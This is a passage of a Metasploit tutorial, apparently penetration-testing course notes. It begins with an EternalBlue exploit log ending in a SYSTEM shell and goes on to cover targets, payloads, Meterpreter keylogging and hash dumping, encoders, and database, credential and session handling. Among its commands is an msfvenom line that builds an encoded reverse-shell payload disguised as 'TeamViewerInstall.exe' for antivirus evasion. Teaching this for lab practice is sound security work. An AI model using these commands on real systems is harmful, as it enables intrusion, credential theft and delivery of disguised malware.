[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter&gt; shell

C:\Windows\system32&gt; whoami
nt authority\system
</code></pre>
<hr>
<h2 id="key-takeaways"><a class="header" href="#key-takeaways">Key Takeaways</a></h2>
<ol>
<li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
<li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
<li><strong>Required Options</strong>: Always check <code>show options</code> to identify required settings before exploitation</li>
<li><strong>Global vs Local</strong>: Use <code>setg</code> for options that should persist across modules (like <code>LHOST</code>), <code>set</code> for module-specific options</li>
<li><strong>Check First</strong>: Use <code>check</code> command when available to verify vulnerability before attempting exploitation</li>
<li><strong>Exploit Failures</strong>: A failed exploit doesn‚Äôt mean the vulnerability doesn‚Äôt exist - manual testing may be required</li>
<li><strong>Rank Matters</strong>: Higher ranked exploits (excellent, great) are more reliable than lower ranked ones</li>
</ol>
<hr>
<h2 id="best-practices"><a class="header" href="#best-practices">Best Practices</a></h2>
<ol>
<li><strong>Always verify targets</strong> before exploitation</li>
<li><strong>Use check command</strong> when available to avoid unnecessary exploitation attempts</li>
<li><strong>Set global options</strong> (<code>setg</code>) for values that won‚Äôt change (like <code>LHOST</code>)</li>
<li><strong>Review module info</strong> (<code>info &lt;module&gt;</code>) for detailed descriptions and references</li>
<li><strong>Test in lab environments</strong> before using in production assessments</li>
<li><strong>Document your process</strong> - note which modules worked and which didn‚Äôt</li>
<li><strong>Understand the exploit</strong> - don‚Äôt blindly run exploits without understanding what they do</li>
</ol>
<hr>
<h2 id="targets"><a class="header" href="#targets">Targets</a></h2>
<p>Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.</p>
<h3 id="viewing-targets"><a class="header" href="#viewing-targets">Viewing Targets</a></h3>
<p>The <code>show targets</code> command issued within an exploit module view displays all available vulnerable targets for that specific exploit. Issuing the same command in the root menu (outside of any selected exploit module) will indicate that you need to select an exploit module first.</p>
<pre><code class="language-bash">msf6 &gt; show targets

[-] No exploit module selected.
</code></pre>
<p>When viewing targets from within an exploit module:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to
   RHOSTS                10.10.10.40                              yes       The target host(s)
   RPORT                 445                                      yes       The Target port (TCP)
   ...

Exploit target:

   Id  Name
   --  ----
   0   Automatic
</code></pre>
<h3 id="using-the-info-command"><a class="header" href="#using-the-info-command">Using the Info Command</a></h3>
<p>The <code>info</code> command helps understand the exploit‚Äôs origins and functionality. It‚Äôs considered best practice to audit code for any artifact generation or additional features before use.</p>
<pre><code class="language-bash">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7
</code></pre>
<h3 id="selecting-a-target"><a class="header" href="#selecting-a-target">Selecting a Target</a></h3>
<p>If you know what versions are running on your target, use the <code>set target &lt;index no.&gt;</code> command:</p>
<pre><code class="language-bash">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6

target =&gt; 6
</code></pre>
<p>Leaving the selection to <code>Automatic</code> lets msfconsole perform service detection on the given target before launching a successful attack.</p>
<h3 id="target-types"><a class="header" href="#target-types">Target Types</a></h3>
<p>Targets can vary by:</p>
<ul>
<li>Service pack</li>
<li>OS version</li>
<li>Language version</li>
</ul>
<p>The return address can vary because a particular language pack changes addresses, a different software version is available, or the addresses are shifted due to hooks. Comments in the exploit module‚Äôs code can help determine what the target is defined by.</p>
<p><strong>To identify a target correctly:</strong></p>
<ol>
<li>Obtain a copy of the target binaries</li>
<li>Use <code>msfpescan</code> to locate a suitable return address</li>
</ol>
<hr>
<h2 id="payloads-detailed"><a class="header" href="#payloads-detailed">Payloads (Detailed)</a></h2>
<p>A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (exploit‚Äôs job) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (payload‚Äôs job).</p>
<h3 id="payload-types"><a class="header" href="#payload-types">Payload Types</a></h3>
<p>There are three different types of payload modules in the Metasploit Framework: <strong>Singles</strong>, <strong>Stagers</strong>, and <strong>Stages</strong>. Whether or not a payload is staged is represented by <code>/</code> in the payload name.</p>
<p>For example:</p>
<ul>
<li><code>windows/shell_bind_tcp</code> - Single payload with no stage</li>
<li><code>windows/shell/bind_tcp</code> - Stager (bind_tcp) + Stage (shell)</li>
</ul>
<h4 id="singles"><a class="header" href="#singles">Singles</a></h4>
<p>A Single payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.</p>
<p>Singles are self-contained payloads - the sole object sent and executed on the target system, getting results immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.</p>
<h4 id="stagers"><a class="header" href="#stagers">Stagers</a></h4>
<p>Stager payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host.</p>
<p>Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.</p>
<p><strong>Windows NX vs. NO-NX Stagers:</strong></p>
<ul>
<li>Reliability issue for NX CPUs and DEP</li>
<li>NX stagers are bigger (VirtualAlloc memory)</li>
<li>Default is now NX + Win7 compatible</li>
</ul>
<h4 id="stages"><a class="header" href="#stages">Stages</a></h4>
<p>Stages are payload components that are downloaded by stager‚Äôs modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others.</p>
<p>Payload stages automatically use middle stagers:</p>
<ul>
<li>A single recv() fails with large payloads</li>
<li>The Stager receives the middle stager</li>
<li>The middle Stager then performs a full download</li>
<li>Also better for RWX</li>
</ul>
<h3 id="staged-payloads"><a class="header" href="#staged-payloads">Staged Payloads</a></h3>
<p>A staged payload is an exploitation process that is modularized and functionally separated to help segregate the different functions into different code blocks, each completing its objective individually but working on chaining the attack together.</p>
<p>The scope of this payload, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with Antivirus (AV) / Intrusion Prevention System (IPS) evasion.</p>
<p><strong>Stage0</strong> represents the initial shellcode sent over the network to the target machine‚Äôs vulnerable service, with the sole purpose of initializing a connection back to the attacker machine (reverse connection). Common names include:</p>
<ul>
<li><code>reverse_tcp</code></li>
<li><code>reverse_https</code></li>
<li><code>bind_tcp</code></li>
</ul>
<h3 id="listing-payloads"><a class="header" href="#listing-payloads">Listing Payloads</a></h3>
<pre><code class="language-bash">msf6 &gt; show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
   -    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   ...
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection)
</code></pre>
<h3 id="filtering-payloads-with-grep"><a class="header" href="#filtering-payloads-with-grep">Filtering Payloads with grep</a></h3>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64)
   ...

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads

[*] 14

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter, Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter, Reverse TCP Stager (RC4 Encryption)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter, Reverse TCP Stager with UUID Support
</code></pre>
<h3 id="selecting-payloads"><a class="header" href="#selecting-payloads">Selecting Payloads</a></h3>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15
# or
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
</code></pre>
<h3 id="common-windows-payloads"><a class="header" href="#common-windows-payloads">Common Windows Payloads</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Payload</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>generic/custom</code></td><td>Generic listener, multi-use</td></tr>
<tr><td><code>generic/shell_bind_tcp</code></td><td>Generic listener, multi-use, normal shell, TCP connection binding</td></tr>
<tr><td><code>generic/shell_reverse_tcp</code></td><td>Generic listener, multi-use, normal shell, reverse TCP connection</td></tr>
<tr><td><code>windows/x64/exec</code></td><td>Executes an arbitrary command (Windows x64)</td></tr>
<tr><td><code>windows/x64/loadlibrary</code></td><td>Loads an arbitrary x64 library path</td></tr>
<tr><td><code>windows/x64/messagebox</code></td><td>Spawns a dialog via MessageBox</td></tr>
<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal shell, single payload, reverse TCP connection</td></tr>
<tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal shell, stager + stage, reverse TCP connection</td></tr>
<tr><td><code>windows/x64/shell/bind_ipv6_tcp</code></td><td>Normal shell, stager + stage, IPv6 Bind TCP stager</td></tr>
<tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + varieties</td></tr>
<tr><td><code>windows/x64/powershell/$</code></td><td>Interactive PowerShell sessions + varieties</td></tr>
<tr><td><code>windows/x64/vncinject/$</code></td><td>VNC Server (Reflective Injection) + varieties</td></tr>
</tbody>
</table>
</div>
<h3 id="configuring-payload-options"><a class="header" href="#configuring-payload-options">Configuring Payload Options</a></h3>
<p>After selecting a payload, configure the required options:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Parameter</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>LHOST</code></td><td>The host‚Äôs IP address (attacker‚Äôs machine)</td></tr>
<tr><td><code>LPORT</code></td><td>Listening port (verify not already in use)</td></tr>
</tbody>
</table>
</div>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; ifconfig

[*] exec: ifconfig

tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500
      inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.15
LHOST =&gt; 10.10.14.15

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40
RHOSTS =&gt; 10.10.10.40
</code></pre>
<h3 id="meterpreter-payload"><a class="header" href="#meterpreter-payload">Meterpreter Payload</a></h3>
<p>Meterpreter payloads offer significant flexibility with vast base functionality. Combined with plugins such as GentilKiwi‚Äôs Mimikatz Plugin, they can automate and quickly deliver parts of the pentest.</p>
<p><strong>Note:</strong> The <code>whoami</code> Windows command doesn‚Äôt work in Meterpreter - use <code>getuid</code> instead.</p>
<h4 id="meterpreter-commands"><a class="header" href="#meterpreter-commands">Meterpreter Commands</a></h4>
<pre><code class="language-bash">meterpreter &gt; help

Core Commands
=============
    background                Backgrounds the current session
    channel                   Displays information or control active channels
    close                     Closes a channel

Stdapi: System Commands
=======================
    getuid        Gets the user that the server is running as
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system

Stdapi: User interface Commands
===============================
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    screenshot     Grab a screenshot of the interactive desktop

Priv: Password database Commands
================================
    hashdump      Dumps the contents of the SAM database
</code></pre>
<h4 id="navigating-with-meterpreter"><a class="header" href="#navigating-with-meterpreter">Navigating with Meterpreter</a></h4>
<pre><code class="language-bash">meterpreter &gt; cd Users
meterpreter &gt; ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris
...

meterpreter &gt; shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users&gt; whoami
nt authority\system
</code></pre>
<p>The channel represents the connection between your device and the target host, established via reverse TCP connection using a Meterpreter Stager and Stage.</p>
<hr>
<h2 id="encoders-1"><a class="header" href="#encoders-1">Encoders</a></h2>
<p>Over 15 years, Encoders have assisted with making payloads compatible with different processor architectures while helping with antivirus evasion.</p>
<h3 id="supported-architectures"><a class="header" href="#supported-architectures">Supported Architectures</a></h3>
<ul>
<li>x64</li>
<li>x86</li>
<li>sparc</li>
<li>ppc</li>
<li>mips</li>
</ul>
<h3 id="purpose-of-encoders"><a class="header" href="#purpose-of-encoders">Purpose of Encoders</a></h3>
<ol>
<li><strong>Architecture Compatibility</strong>: Change payload to run on different operating systems and architectures</li>
<li><strong>Bad Character Removal</strong>: Remove hexadecimal opcodes known as bad characters from the payload</li>
<li><strong>AV Evasion</strong>: Encoding in different formats can help with detection evasion (though modern AV has caught up)</li>
</ol>
<h3 id="shikata-ga-nai-sgn"><a class="header" href="#shikata-ga-nai-sgn">Shikata Ga Nai (SGN)</a></h3>
<p>Shikata Ga Nai (‰ªïÊñπ„Åå„Å™„ÅÑ - ‚ÄúIt cannot be helped‚Äù) was one of the most utilized encoding schemes because it was very hard to detect payloads encoded through its mechanism. However, modern detection methods have caught up, and these encoded payloads are far from being universally undetectable anymore.</p>
<h3 id="listing-encoders"><a class="header" href="#listing-encoders">Listing Encoders</a></h3>
<pre><code class="language-bash">msf6 &gt; show encoders

Encoders
========

   #   Name                          Disclosure Date  Rank       Check  Description
   -   ----                          ---------------  ----       -----  -----------
   0   cmd/brace                                      low        No     Bash Brace Expansion Command Encoder
   1   cmd/echo                                       good       No     Echo Command Encoder
   ...
   26  x86/shikata_ga_nai            2019-01-07       excellent  No     Polymorphic XOR Additive Feedback Encoder
   27  x64/xor                                        manual     No     XOR Encoder
   28  x64/zutto_dekiru                               manual     No     Zutto Dekiru
</code></pre>
<h3 id="generating-encoded-payloads-with-msfvenom"><a class="header" href="#generating-encoded-payloads-with-msfvenom">Generating Encoded Payloads with msfvenom</a></h3>
<h4 id="basic-encoded-payload"><a class="header" href="#basic-encoded-payload">Basic Encoded Payload</a></h4>
<pre><code class="language-bash">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
</code></pre>
<h4 id="multiple-encoding-iterations"><a class="header" href="#multiple-encoding-iterations">Multiple Encoding Iterations</a></h4>
<pre><code class="language-bash">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
...
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
</code></pre>
<p><strong>Note:</strong> Even with 10 iterations, modern AV products still often detect these payloads. Additional evasion methodologies are required for reliable evasion.</p>
<h3 id="virustotal-analysis"><a class="header" href="#virustotal-analysis">VirusTotal Analysis</a></h3>
<p>Metasploit offers <code>msf-virustotal</code> tool to analyze payloads (requires free VirusTotal registration):</p>
<pre><code class="language-bash">msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe

[*] Using API key: &lt;API key&gt;
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;
</code></pre>
<hr>
<h2 id="databases"><a class="header" href="#databases">Databases</a></h2>
<p>Databases in msfconsole are used to keep track of your results. During complex assessments, things can get complicated due to the sheer amount of search results, entry points, detected issues, and discovered credentials.</p>
<p>Msfconsole has built-in support for the PostgreSQL database system. This provides:</p>
<ul>
<li>Direct, quick, and easy access to scan results</li>
<li>Ability to import and export results with third-party tools</li>
<li>Configure Exploit module parameters with existing findings</li>
</ul>
<h3 id="setting-up-the-database"><a class="header" href="#setting-up-the-database">Setting up the Database</a></h3>
<h4 id="check-postgresql-status"><a class="header" href="#check-postgresql-status">Check PostgreSQL Status</a></h4>
<pre><code class="language-bash">sudo service postgresql status

‚óè postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
</code></pre>
<h4 id="start-postgresql"><a class="header" href="#start-postgresql">Start PostgreSQL</a></h4>
<pre><code class="language-bash">sudo systemctl start postgresql
</code></pre>
<h4 id="initialize-msf-database"><a class="header" href="#initialize-msf-database">Initialize MSF Database</a></h4>
<pre><code class="language-bash">sudo msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
</code></pre>
<p>If you encounter errors, try updating Metasploit (<code>apt update</code>) and reinitializing.</p>
<h4 id="check-database-status"><a class="header" href="#check-database-status">Check Database Status</a></h4>
<pre><code class="language-bash">sudo msfdb status
</code></pre>
<h3 id="connecting-to-the-database"><a class="header" href="#connecting-to-the-database">Connecting to the Database</a></h3>
<pre><code class="language-bash">msf6 &gt; db_status

[*] Connected to msf. Connection type: postgresql.
</code></pre>
<p>If you receive an error about the database not being connected:</p>
<pre><code class="language-bash">msf6 &gt; db_connect msf@msf

Connected to Postgres data service: 127.0.0.1/msf
</code></pre>
<h3 id="workspaces"><a class="header" href="#workspaces">Workspaces</a></h3>
<p>Workspaces help organize different assessment projects. Similar to folders, workspaces isolate different projects‚Äô host data, loot, and activities.</p>
<pre><code class="language-bash">msf6 &gt; workspace

* default
</code></pre>
<h4 id="workspace-commands"><a class="header" href="#workspace-commands">Workspace Commands</a></h4>
<pre><code class="language-bash">msf6 &gt; workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
</code></pre>
<h4 id="create-and-select-workspace"><a class="header" href="#create-and-select-workspace">Create and Select Workspace</a></h4>
<pre><code class="language-bash">msf6 &gt; workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1

msf6 &gt; workspace Target_1 

[*] Workspace: Target_1

msf6 &gt; workspace

  default
* Target_1
</code></pre>
<h3 id="importing-scan-results"><a class="header" href="#importing-scan-results">Importing Scan Results</a></h3>
<p>Import Nmap XML scans into the database (XML format is preferred for <code>db_import</code>):</p>
<pre><code class="language-bash">msf6 &gt; db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml
</code></pre>
<h3 id="using-nmap-inside-msfconsole"><a class="header" href="#using-nmap-inside-msfconsole">Using Nmap Inside MSFconsole</a></h3>
<p>Scan directly from msfconsole using <code>db_nmap</code>:</p>
<pre><code class="language-bash">msf6 &gt; db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
</code></pre>
<h3 id="viewing-data"><a class="header" href="#viewing-data">Viewing Data</a></h3>
<h4 id="hosts"><a class="header" href="#hosts">Hosts</a></h4>
<pre><code class="language-bash">msf6 &gt; hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         
</code></pre>
<h4 id="hosts-command-options"><a class="header" href="#hosts-command-options">Hosts Command Options</a></h4>
<pre><code class="language-bash">msf6 &gt; hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c &lt;col1,col2&gt;    Only show the given columns
  -C &lt;col1,col2&gt;    Only show the given columns until the next restart
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o &lt;file&gt;         Send output to a file in csv format
  -O &lt;column&gt;       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts
</code></pre>
<h4 id="services"><a class="header" href="#services">Services</a></h4>
<pre><code class="language-bash">msf6 &gt; services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
</code></pre>
<h4 id="services-command-options"><a class="header" href="#services-command-options">Services Command Options</a></h4>
<pre><code class="language-bash">msf6 &gt; services -h

Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c &lt;col1,col2&gt;    Only show the given columns
  -p &lt;port&gt;         Search for a list of ports
  -r &lt;protocol&gt;     Protocol type of the service being added [tcp|udp]
  -s &lt;name&gt;         List creds matching comma-separated service names
  -u,--up           Only show services which are up
  -o &lt;file&gt;         Send output to a file in csv format
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service
</code></pre>
<h3 id="credentials"><a class="header" href="#credentials">Credentials</a></h3>
<p>The <code>creds</code> command allows you to visualize credentials gathered during interactions with target hosts. You can also add credentials manually, match with port specifications, and add descriptions.</p>
<pre><code class="language-bash">msf6 &gt; creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    realm     :  Realm
    realm-type:  Realm type (domain db2db sid pgdb rsync wildcard)

Examples: Adding
   creds add user:admin password:notpassword realm:workgroup
   creds add user:guest password:'guest password'
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5

Filter options for listing:
  -P,--password &lt;text&gt;  List passwords that match this text
  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec
  -s &lt;svc names&gt;        List creds matching comma-separated service names
  -u,--user &lt;text&gt;      List users that match this text
  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash
  -R,--rhosts           Set RHOSTS from the results of the search

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with SSH or SMB services
  creds -t NTLM       # All NTLM creds
</code></pre>
<h3 id="loot"><a class="header" href="#loot">Loot</a></h3>
<p>The <code>loot</code> command works with credentials to offer an at-a-glance list of owned services and users. Loot refers to hash dumps from different system types (hashes, passwd, shadow, etc.).</p>
<pre><code class="language-bash">msf6 &gt; loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t &lt;type1,type2&gt;  Search for a list of types
  -S,--search       Search string to filter by
</code></pre>
<hr>
<h2 id="sessions"><a class="header" href="#sessions">Sessions</a></h2>
<p>MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of Sessions, which creates dedicated control interfaces for all of your deployed modules.</p>
<p>Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs.</p>
<p><strong>Important:</strong> Once a session is placed in the background, it will continue to run, and our connection to the target host will persist. Sessions can, however, die if something goes wrong during the payload runtime, causing the communication channel to tear down.</p>
<h3 id="backgrounding-sessions"><a class="header" href="#backgrounding-sessions">Backgrounding Sessions</a></h3>
<p>While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by:</p>
<ol>
<li>Pressing the <code>[CTRL] + [Z]</code> key combination</li>
<li>Typing the <code>background</code> command in Meterpreter stages</li>
</ol>
<p>This will prompt with a confirmation message. After accepting, you‚Äôll be taken back to the msfconsole prompt (<code>msf6 &gt;</code>) and can immediately launch a different module.</p>
<h3 id="listing-active-sessions"><a class="header" href="#listing-active-sessions">Listing Active Sessions</a></h3>
<p>Use the <code>sessions</code> command to view currently active sessions:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/psexec_psh) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)
</code></pre>
<h3 id="interacting-with-a-session"><a class="header" href="#interacting-with-a-session">Interacting with a Session</a></h3>
<p>Use the <code>sessions -i [no.]</code> command to open up a specific session:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; 
</code></pre>
<h3 id="using-sessions-with-post-exploitation-modules"><a class="header" href="#using-sessions-with-post-exploitation-modules">Using Sessions with Post-Exploitation Modules</a></h3>
<p>This is specifically useful when you want to run an additional module on an already exploited system with a formed, stable communication channel.</p>
<p><strong>Workflow:</strong></p>
<ol>
<li>Background your current session (formed from first exploit success)</li>
<li>Search for the second module you wish to run</li>
<li>Select the session number on which the module should run (from <code>show options</code>)</li>
</ol>
<p>Usually, these modules can be found in the <code>post</code> category (Post-Exploitation modules). Main archetypes include:</p>
<ul>
<li>Credential gatherers</li>
<li>Local exploit suggesters</li>
<li>Internal network scanners</li>
</ul>
<pre><code class="language-bash"># Background current session
meterpreter &gt; background
[*] Backgrounding session 1...

# Search for post module
msf6 &gt; search type:post platform:windows gather

# Select module
msf6 &gt; use post/windows/gather/credentials/credential_collector

# View options - note the SESSION option
msf6 post(windows/gather/credentials/credential_collector) &gt; show options

Module options (post/windows/gather/credentials/credential_collector):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

# Set the session
